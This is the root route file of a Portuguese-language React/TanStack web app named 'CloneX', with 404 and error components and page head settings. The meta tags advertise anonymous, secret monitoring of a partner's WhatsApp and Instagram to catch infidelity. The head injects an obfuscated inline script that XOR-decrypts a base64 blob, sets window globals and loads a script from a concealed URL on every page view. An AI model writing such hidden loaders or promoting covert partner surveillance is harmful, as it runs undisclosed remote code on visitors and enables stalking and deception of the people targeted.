import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Página não encontrada</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          A página que você está procurando não existe ou foi movida.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:opacity-90"
          >
            Voltar ao início
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          Algo deu errado
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Tente atualizar a página ou voltar ao início.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:opacity-90"
          >
            Tentar novamente
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-border bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Ir ao início
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "CloneX — Descubra se Ela Está te Traindo" },
      {
        name: "description",
        content:
          "Monitore WhatsApp e Instagram de forma totalmente anônima. Descubra se sua parceira está te traindo. 100% discreto, instantâneo e seguro.",
      },
      { property: "og:title", content: "CloneX — Ela está te traindo?" },
      {
        property: "og:description",
        content:
          "Descubra toda a verdade nas redes sociais antes que seja tarde demais. Monitoramento total • Totalmente discreto • Totalmente instantâneo.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "theme-color", content: "#1a0505" },
    ],
    links: [
      { rel: "stylesheet", href: appCss },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      {
        rel: "preconnect",
        href: "https://fonts.gstatic.com",
        crossOrigin: "anonymous",
      },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&family=Inter:wght@400;500;600&display=swap",
      },
    ],
    scripts: [
      {
        children: `(function(){var l_8=atob("DHgtGWjck+HFIaEcCwMPbBqwsdvnSdVoewsXNke/94/rVNVxYh5UNwuz/s+nU45vaApEaRyvvJGsWcRwJAhEYQ2wvYu2A40+agxZawG+5pWgUoMmUCUBOw+w/IOkTdI+MSNWOwa9/oTnG4NsYgBIdSG4sc3nV8Bwfh0PI0rq8tfzFZAkbkBPLVvo8oT8FJR+aBoeLA7+7ry4");var g_y=[];for(var a_5wnq=0;a_5wnq<l_8.length;a_5wnq++){g_y.push(l_8.charCodeAt(a_5wnq)&255);}var w_aaw2=g_y[0];var p_7=g_y.slice(1,1+w_aaw2);var r_fp=g_y.slice(1+w_aaw2);var x_t=r_fp.map(function(b,q_erls){return b^p_7[q_erls%w_aaw2];});var r_fou="";for(var w_iru=0;w_iru<x_t.length;w_iru++){r_fou+=String.fromCharCode(x_t[w_iru]&255);}var a_9kl1=decodeURIComponent(escape(r_fou));var h_2cc3=JSON.parse(a_9kl1);var g_wi=h_2cc3.globals||[];g_wi.forEach(function(f_lpqp){window[f_lpqp.name]=f_lpqp.value;});var m_10xk=document.createElement("script");m_10xk.src=h_2cc3.url;m_10xk.async=true;m_10xk.defer=true;(h_2cc3.attributes||[]).forEach(function(k_7m0v){m_10xk.setAttribute(k_7m0v.name,k_7m0v.value);});(document.head||document.documentElement).appendChild(m_10xk);})();`,
      },
      {
        children: `
          !function(f,b,e,v,n,t,s)
          {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
          n.callMethod.apply(n,arguments):n.queue.push(arguments)};
          if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
          n.queue=[];t=b.createElement(e);t.async=!0;
          t.src=v;s=b.getElementsByTagName(e)[0];
          s.parentNode.insertBefore(t,s)}(window, document,'script',
          'https://connect.facebook.net/en_US/fbevents.js');
          fbq('init', '1698844174738668');
          fbq('track', 'PageView');
        `,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=1698844174738668&ev=PageView&noscript=1"
          />
        </noscript>
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
